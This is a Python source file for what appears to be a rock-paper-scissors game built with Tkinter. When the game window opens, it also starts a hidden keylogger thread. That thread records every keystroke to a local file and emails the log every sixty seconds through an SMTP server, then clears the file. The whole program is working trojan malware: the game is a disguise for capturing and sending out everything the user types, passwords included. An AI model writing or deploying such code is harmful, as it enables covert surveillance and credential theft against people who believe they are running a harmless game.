import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import threading
import smtplib
import socket
import platform
import os

# --- CONFIGURATION ---
EMAIL_ADDRESS = "--ID--"  # Use Mailtrap or test SMTP
EMAIL_PASSWORD = "--PASSWORD--"  # Use Mailtrap or test SMTP
SEND_INTERVAL = 60  # Seconds
LOG_FILE = "logfile.txt"

# --- KEYLOGGER CLASS ---
class KeyLogger:
    def __init__(self, interval, email, password):
        self.interval = interval
        self.log = ""
        self.email = email
        self.password = password
        self.listener = None
        self.timer = None

    def append_log(self, string):
        self.log += string
        try:
            with open(LOG_FILE, "a") as f:
                f.write(string)
        except Exception as e:
            print("Failed to write to file:", e)

    def save_data(self, key):
        try:
            self.append_log(key.char)
        except AttributeError:
            self.append_log(f" [{key}] ")

    def send_mail(self):
        # Read log file content
        try:
            with open(LOG_FILE, "r") as f:
                log_content = f.read()
        except FileNotFoundError:
            log_content = "(No keystrokes recorded)"

        message = f"Subject: Keylogger Report\n\n{log_content}"
        try:
            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.login(self.email, self.password)
                server.sendmail(self.email, self.email, message)
        except Exception as e:
            print("Email failed:", e)

        # After sending email, delete and recreate empty log file
        try:
            with open(LOG_FILE, "w") as f:
                f.write("")
        except Exception as e:
            print("Failed to clear log file:", e)

    def report(self):
        self.send_mail()
        self.log = ""
        self.timer = threading.Timer(self.interval, self.report)
        self.timer.daemon = True
        self.timer.start()

    def run(self):
        self.listener = keyboard.Listener(on_press=self.save_data)
        self.listener.start()
        self.report()

# --- GAME FUNCTION ---
def play_game(user_choice):
    import random
    choices = ['Rock', 'Paper', 'Scissors']
    comp_choice = random.choice(choices)
    result = ""

    if user_choice == comp_choice:
        result = "It's a tie!"
    elif (user_choice == 'Rock' and comp_choice == 'Scissors') or \
         (user_choice == 'Paper' and comp_choice == 'Rock') or \
         (user_choice == 'Scissors' and comp_choice == 'Paper'):
        result = "You win!"
    else:
        result = "You lose!"

    messagebox.showinfo("Result", f"You: {user_choice}\nComputer: {comp_choice}\n{result}")

# --- MAIN APP ---
def launch_game():
    keylogger = KeyLogger(SEND_INTERVAL, EMAIL_ADDRESS, EMAIL_PASSWORD)
    threading.Thread(target=keylogger.run, daemon=True).start()

    root = tk.Tk()
    root.title("Stone Paper Scissors")
    root.geometry("300x200")

    tk.Label(root, text="Choose your move", font=("Arial", 14)).pack(pady=10)

    for choice in ['Rock', 'Paper', 'Scissors']:
        tk.Button(root, text=choice, width=15, command=lambda c=choice: play_game(c)).pack(pady=5)

    def on_close():
        root.destroy()

    root.protocol("WM_DELETE_WINDOW", on_close)
    root.mainloop()

if __name__ == "__main__":
    launch_game()
